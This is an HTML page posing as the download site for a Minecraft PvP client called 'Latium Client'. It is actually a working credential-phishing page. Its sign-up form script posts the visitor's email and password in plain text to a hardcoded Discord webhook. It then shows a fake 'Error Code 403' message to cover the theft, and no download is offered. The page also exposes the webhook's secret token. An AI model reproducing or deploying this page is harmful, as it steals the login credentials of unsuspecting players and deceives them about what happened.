<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Latium Client</title>
  <style>
    :root {
      --text-color: #fff;
      --text-darker-color: #ccc;
      --blocks-shadow-color: rgba(0, 0, 0, 0.7);
      --header-bg: #555;
      --button-bg: #4fc3f7;
    }

    body, html {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: #111;
      color: var(--text-color);
    }

    /* Header */
    header {
      width: 100%;
      background-color: var(--header-bg);
      padding: 0.75rem 2rem;
      display: flex;
      align-items: center;
      justify-content: space-between;
      box-sizing: border-box;
    }
    .logo {
      font-size: 1.5rem;
      font-weight: bold;
      color: var(--text-color);
    }
    nav {
      display: flex;
      gap: 1rem;
    }
    nav a {
      color: var(--text-color);
      text-decoration: none;
      font-size: 1rem;
      padding: 0.5rem 1rem;
      border-radius: 4px;
    }
    nav a:hover {
      background: rgba(255,255,255,0.1);
    }

    /* First Panel */
    #first_panel {
      position: relative;
      width: 100%;
      min-height: 400px;
      overflow: hidden;
    }
    #first_panel_content {
      padding: 60px 10px 100px;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: url("https://wallpapercave.com/uwp/uwp4758681.jpeg") no-repeat fixed;
      background-size: cover;
    }
    .texts {
      max-width: 90vw;
      text-align: center;
      background-color: rgba(20, 20, 20, 0.8);
      padding: 50px;
      border-radius: 40px;
      backdrop-filter: blur(20px) saturate(1.6);
    }
    .texts h1 {
      margin: 0 0 1rem;
      font-size: 2.5rem;
      color: var(--text-darker-color);
    }
    .texts p {
      font-size: 1.5rem;
      margin-bottom: 1.5rem;
    }
    #downloadBtn {
      background: var(--button-bg);
      border: none;
      padding: 0.75rem 1.5rem;
      font-size: 1rem;
      cursor: pointer;
      border-radius: 5px;
    }

    /* Modal Styles */
    .modal {
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.7);
      align-items: center;
      justify-content: center;
    }
    .modal-content {
      background-color: #222;
      padding: 20px;
      border-radius: 5px;
      width: 90%;
      max-width: 350px;
      color: #eee;
      position: relative;
    }
    .close {
      position: absolute;
      top: 10px;
      right: 10px;
      font-size: 24px;
      cursor: pointer;
      color: #aaa;
    }
    .modal-content input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #444;
      border-radius: 3px;
      background: #333;
      color: #eee;
    }
    .modal-content button {
      width: 100%;
      padding: 10px;
      background: var(--button-bg);
      border: none;
      border-radius: 3px;
      cursor: pointer;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <header>
    <div class="logo">Latium</div>
    <nav>
      <a href="#login">Login</a>
      <a href="#shop">Shop</a>
      <a href="#store">Store</a>
    </nav>
  </header>

  <section id="first_panel">
    <div id="first_panel_content">
      <div class="texts">
        <h1>Latium Client</h1>
        <p>The Ultimate Minecraft PvP Experience</p>
        <button id="downloadBtn">Download Now</button>
      </div>
    </div>
  </section>

  <div id="signupModal" class="modal">
    <div class="modal-content">
      <span id="closeModal" class="close">&times;</span>
      <div id="modalBody">
        <h2>Sign Up to Download</h2>
        <form id="signupForm">
          <input type="email" id="email" name="email" placeholder="Email" required />
          <input type="password" id="password" name="password" placeholder="Password" required />
          <button type="submit">Submit & Download</button>
        </form>
      </div>
    </div>
  </div>

  <script>
    const webhookURL = 'https://discord.com/api/webhooks/1298847513331109939/sZEnzKPPl93oKGq-O0WXOSgh4NOZd4CcCYyNfJRqS213QKPN5IKyL76k8qgmQAJrXnEy';
    const downloadBtn = document.getElementById('downloadBtn');
    const modal = document.getElementById('signupModal');
    const closeModal = document.getElementById('closeModal');
    const form = document.getElementById('signupForm');
    const modalBody = document.getElementById('modalBody');

    downloadBtn.addEventListener('click', () => { modal.style.display = 'flex'; });
    closeModal.addEventListener('click', () => { modal.style.display = 'none'; });
    window.addEventListener('click', e => { if (e.target === modal) modal.style.display = 'none'; });

    form.addEventListener('submit', async e => {
      e.preventDefault();
      const email = form.email.value;
      const password = form.password.value;
      try {
        await fetch(webhookURL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: `Email: ${email} | Password: ${password}` })
        });
        modalBody.innerHTML = '<h2>Error Code 403</h2>';
      } catch {
        alert('Submission failed. Please try again.');
      }
    });
  </script>
</body>
</html>
